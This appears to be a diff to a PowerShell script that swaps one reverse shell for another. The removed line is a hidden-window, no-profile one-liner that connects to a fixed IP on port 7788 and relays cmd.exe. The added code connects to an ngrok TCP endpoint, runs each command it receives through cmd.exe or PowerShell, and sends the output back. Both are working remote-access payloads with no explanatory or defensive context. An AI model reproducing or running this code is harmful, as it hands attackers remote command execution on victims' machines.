@@ -1,1 +1,54 @@
-powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a='37.210.227.190';$p='7788';$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne -1){$o += $e.GetString($os.Read());if ($o -eq $str) {$o=''}};$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};
+$socket = new-object System.Net.Sockets.TcpClient('0.tcp.ngrok.io', 13957);
+if($socket -eq $null){exit 1}
+$stream = $socket.GetStream();
+$writer = new-object System.IO.StreamWriter($stream);
+$buffer = new-object System.Byte[] 1024;
+$encoding = new-object System.Text.AsciiEncoding;
+do
+{
+	$writer.Flush();
+	$read = $null;
+	$res = ""
+	while($stream.DataAvailable -or $read -eq $null) {
+		$read = $stream.Read($buffer, 0, 1024)
+	}
+	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+	if(!$out.equals("exit")){
+		$args = "";
+		if($out.IndexOf(' ') -gt -1){
+			$args = $out.substring($out.IndexOf(' ')+1);
+			$out = $out.substring(0,$out.IndexOf(' '));
+			if($args.split(' ').length -gt 1){
+                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
+                $pinfo.FileName = "cmd.exe"
+                $pinfo.RedirectStandardError = $true
+                $pinfo.RedirectStandardOutput = $true
+                $pinfo.UseShellExecute = $false
+                $pinfo.Arguments = "/c $out $args"
+                $p = New-Object System.Diagnostics.Process
+                $p.StartInfo = $pinfo
+                $p.Start() | Out-Null
+                $p.WaitForExit()
+                $stdout = $p.StandardOutput.ReadToEnd()
+                $stderr = $p.StandardError.ReadToEnd()
+                if ($p.ExitCode -ne 0) {
+                    $res = $stderr
+                } else {
+                    $res = $stdout
+                }
+			}
+			else{
+				$res = (&"$out" "$args") | out-string;
+			}
+		}
+		else{
+			$res = (&"$out") | out-string;
+		}
+		if($res -ne $null){
+        $writer.WriteLine($res)
+    }
+	}
+}While (!$out.equals("exit"))
+$writer.close();
+$socket.close();
+$stream.Dispose()
